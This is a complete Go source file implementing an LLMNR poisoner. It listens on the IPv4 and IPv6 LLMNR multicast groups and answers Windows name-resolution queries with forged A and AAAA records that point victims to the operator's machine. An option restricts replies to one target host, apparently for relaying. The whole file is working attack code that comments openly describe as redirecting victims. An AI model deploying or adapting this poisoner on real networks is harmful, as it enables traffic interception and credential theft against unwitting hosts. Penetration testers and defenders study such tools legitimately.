// Package llmnr implements an LLMNR (RFC 4795) poisoner.
//
// When a Windows host can't resolve a name via DNS it falls back to LLMNR —
// a UDP multicast query sent to 224.0.0.252:5355. We listen on that group,
// parse every incoming query, and reply with our own IP (auto-detected from
// the interface) so the victim connects to us instead of the real host.
package llmnr

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
)

const (
	MulticastGroup  = "224.0.0.252"
	MulticastGroup6 = "ff02::1:3"
	Port            = 5355

	// LLMNR flag bits (big-endian, offset 2-3 of packet)
	flagQR = 0x8000 // 1 = response, 0 = query

	// DNS/LLMNR record types
	typeA    = 0x0001
	typeAAAA = 0x001c
	typeANY  = 0x00ff

	defaultTTL = 30 // seconds
)

// Query holds the parsed fields from an LLMNR question packet.
type Query struct {
	TID  [2]byte
	Name string
	Type uint16
}

// ParseQuery parses a raw LLMNR UDP payload.
// Returns (query, true) for a well-formed query packet, (nil, false) otherwise.
//
// LLMNR wire layout (RFC 4795 §2.1.1):
//
//	[ID 2][FLAGS 2][QDCOUNT 2][ANCOUNT 2][NSCOUNT 2][ARCOUNT 2]
//	[QNAME-len 1][QNAME N][null 1][QTYPE 2][QCLASS 2]
func ParseQuery(data []byte) (*Query, bool) {
	if len(data) < 13 {
		return nil, false
	}

	// QR bit must be 0 — we only handle queries.
	flags := binary.BigEndian.Uint16(data[2:4])
	if flags&flagQR != 0 {
		return nil, false
	}

	qdcount := binary.BigEndian.Uint16(data[4:6])
	if qdcount < 1 {
		return nil, false
	}

	// QNAME is length-prefixed starting at byte 12.
	nameLen := int(data[12])
	if nameLen == 0 {
		return nil, false
	}

	// Minimum tail: nameLen bytes + null(1) + type(2) + class(2)
	if len(data) < 13+nameLen+5 {
		return nil, false
	}

	name := string(data[13 : 13+nameLen])

	// QTYPE follows the null terminator.
	qType := binary.BigEndian.Uint16(data[14+nameLen : 16+nameLen])

	var tid [2]byte
	copy(tid[:], data[0:2])

	return &Query{TID: tid, Name: name, Type: qType}, true
}

// buildAAAAResponse constructs an LLMNR AAAA-record (IPv6) answer.
func buildAAAAResponse(q *Query, ip6 net.IP) []byte {
	qn  := []byte(q.Name)
	ip6b := ip6.To16()

	pkt := make([]byte, 0, 12+2*(1+len(qn)+1+4)+14)

	pkt = append(pkt, q.TID[0], q.TID[1])
	pkt = append(pkt, 0x80, 0x00)
	pkt = append(pkt, 0x00, 0x01)
	pkt = append(pkt, 0x00, 0x01)
	pkt = append(pkt, 0x00, 0x00)
	pkt = append(pkt, 0x00, 0x00)

	pkt = append(pkt, byte(len(qn)))
	pkt = append(pkt, qn...)
	pkt = append(pkt, 0x00)
	pkt = append(pkt, 0x00, 0x1c) // QTYPE AAAA
	pkt = append(pkt, 0x00, 0x01)

	pkt = append(pkt, byte(len(qn)))
	pkt = append(pkt, qn...)
	pkt = append(pkt, 0x00)
	pkt = append(pkt, 0x00, 0x1c)                    // TYPE AAAA
	pkt = append(pkt, 0x00, 0x01)                    // CLASS IN
	pkt = append(pkt, 0x00, 0x00, 0x00, defaultTTL)  // TTL 30 s
	pkt = append(pkt, 0x00, 0x10)                    // RDLENGTH 16
	pkt = append(pkt, ip6b...)                        // 16-byte IPv6 address

	return pkt
}

// buildAResponse constructs an LLMNR A-record (IPv4) answer.
//
// Wire layout:
//
//	Header (12 bytes)
//	Question: [len 1][name N][null 1][type 2][class 2]
//	Answer:   [len 1][name M][null 1][type 2][class 2][TTL 4][rdlen 2][ip 4]
func buildAResponse(q *Query, ip net.IP) []byte {
	ip4 := ip.To4()
	qn := []byte(q.Name)

	pkt := make([]byte, 0, 12+2*(1+len(qn)+1+4)+6)

	// Header
	pkt = append(pkt, q.TID[0], q.TID[1]) // Transaction ID (echoed from query)
	pkt = append(pkt, 0x80, 0x00)          // FLAGS: QR=1 (response), RCODE=0
	pkt = append(pkt, 0x00, 0x01)          // QDCOUNT = 1
	pkt = append(pkt, 0x00, 0x01)          // ANCOUNT = 1
	pkt = append(pkt, 0x00, 0x00)          // NSCOUNT = 0
	pkt = append(pkt, 0x00, 0x00)          // ARCOUNT = 0

	// Question section (echo the question back)
	pkt = append(pkt, byte(len(qn))) // QNAME length
	pkt = append(pkt, qn...)         // QNAME
	pkt = append(pkt, 0x00)          // QNAME null terminator
	pkt = append(pkt, 0x00, 0x01)   // QTYPE  = A (0x0001)
	pkt = append(pkt, 0x00, 0x01)   // QCLASS = IN (0x0001)

	// Answer section
	pkt = append(pkt, byte(len(qn))) // NAME length (same name)
	pkt = append(pkt, qn...)         // NAME
	pkt = append(pkt, 0x00)          // NAME null terminator
	pkt = append(pkt, 0x00, 0x01)   // TYPE  = A
	pkt = append(pkt, 0x00, 0x01)   // CLASS = IN
	pkt = append(pkt, 0x00, 0x00, 0x00, defaultTTL) // TTL = 30 s
	pkt = append(pkt, 0x00, 0x04)                   // RDLENGTH = 4
	pkt = append(pkt, ip4[0], ip4[1], ip4[2], ip4[3]) // RDATA = our IP

	return pkt
}

// ifaceIPv4 returns the first unicast IPv4 address bound to iface.
func ifaceIPv4(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}

// ifaceIPv6 returns the first link-local IPv6 address bound to iface.
func ifaceIPv6(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip.To4() == nil && ip.IsLinkLocalUnicast() {
			return ip, nil
		}
	}
	return nil, fmt.Errorf("no IPv6 link-local address on interface %s", iface.Name)
}

// Poisoner joins the LLMNR multicast group on Interface and answers every
// A / ANY query with its own interface IPv4 address.
type Poisoner struct {
	Interface string // e.g. "eth0"
	RelayFrom string // if non-empty, only respond to queries from this IP

	// mu guards seen.
	mu   sync.Mutex
	seen map[string]struct{}
}

// Run joins the LLMNR multicast groups (IPv4 and IPv6) and blocks poisoning
// queries until the connection breaks or the process exits.
func (p *Poisoner) Run() error {
	if p.seen == nil {
		p.seen = make(map[string]struct{})
	}

	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}

	ourIP, err := ifaceIPv4(iface)
	if err != nil {
		return err
	}

	// Start IPv6 LLMNR listener in background if we have a link-local IPv6 address.
	if ourIP6, err := ifaceIPv6(iface); err == nil {
		go p.runIPv6(iface, ourIP6)
	}

	group, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", MulticastGroup, Port))
	if err != nil {
		return fmt.Errorf("resolve multicast addr: %w", err)
	}

	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		return fmt.Errorf("listen %s:%d on %s: %w", MulticastGroup, Port, p.Interface, err)
	}
	defer conn.Close()

	fmt.Printf("\x1b[96m[LLMNR]\x1b[0m Poisoner started  interface=%s  listen=%s:%d  spoof=%s\n",
		p.Interface, MulticastGroup, Port, ourIP)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			return fmt.Errorf("read: %w", err)
		}

		pkt := make([]byte, n)
		copy(pkt, buf[:n])

		go p.handle(conn, pkt, src, ourIP)
	}
}

// runIPv6 listens on the LLMNR IPv6 multicast group (ff02::1:3:5355) and
// responds to AAAA queries with the interface's link-local IPv6 address.
func (p *Poisoner) runIPv6(iface *net.Interface, ourIP6 net.IP) {
	group, err := net.ResolveUDPAddr("udp6", fmt.Sprintf("[%s]:%d", MulticastGroup6, Port))
	if err != nil {
		fmt.Printf("[!] \x1b[96m[LLMNR]\x1b[0m IPv6 resolve: %v\n", err)
		return
	}
	conn, err := net.ListenMulticastUDP("udp6", iface, group)
	if err != nil {
		fmt.Printf("[!] \x1b[96m[LLMNR]\x1b[0m IPv6 listen: %v (no IPv6 LLMNR)\n", err)
		return
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			return
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go p.handleIPv6(conn, pkt, src, ourIP6)
	}
}

func (p *Poisoner) handleIPv6(conn *net.UDPConn, data []byte, src *net.UDPAddr, ourIP6 net.IP) {
	q, ok := ParseQuery(data)
	if !ok {
		return
	}
	srcIP := src.IP.String()
	// Strip zone ID suffix (e.g. %eth0) from link-local addresses.
	if i := strings.Index(srcIP, "%"); i >= 0 {
		srcIP = srcIP[:i]
	}
	if srcIP == ourIP6.String() {
		return
	}
	if p.RelayFrom != "" && srcIP != p.RelayFrom {
		return
	}
	switch q.Type {
	case typeAAAA, typeANY:
		resp := buildAAAAResponse(q, ourIP6)
		if _, err := conn.WriteToUDP(resp, src); err != nil {
			fmt.Printf("[!] \x1b[96m[LLMNR]\x1b[0m IPv6 send to %s failed: %v\n", srcIP, err)
			return
		}
		p.logOnce(srcIP, q.Name, ourIP6)
	}
}

func (p *Poisoner) handle(conn *net.UDPConn, data []byte, src *net.UDPAddr, ourIP net.IP) {
	q, ok := ParseQuery(data)
	if !ok {
		return
	}

	// Strip ::ffff: prefix from IPv6-mapped IPv4 addresses.
	srcIP := strings.TrimPrefix(src.IP.String(), "::ffff:")

	// Don't answer our own queries.
	if srcIP == ourIP.String() {
		return
	}

	// When relay-from is set, only respond to that specific host.
	if p.RelayFrom != "" && srcIP != p.RelayFrom {
		return
	}

	switch q.Type {
	case typeA, typeANY:
		resp := buildAResponse(q, ourIP)
		if _, err := conn.WriteToUDP(resp, src); err != nil {
			fmt.Printf("[!] \x1b[96m[LLMNR]\x1b[0m send to %s failed: %v\n", srcIP, err)
			return
		}
		p.logOnce(srcIP, q.Name, ourIP)
	}
}

// logOnce prints a poisoning event, deduplicating per (srcIP, name) pair.
func (p *Poisoner) logOnce(srcIP, name string, ourIP net.IP) {
	key := srcIP + "|" + name
	p.mu.Lock()
	_, dup := p.seen[key]
	if !dup {
		p.seen[key] = struct{}{}
	}
	p.mu.Unlock()

	if !dup {
		fmt.Printf("\x1b[96m[LLMNR]\x1b[0m  Poisoned answer sent to %s for name %s\n", srcIP, name)
	}
}
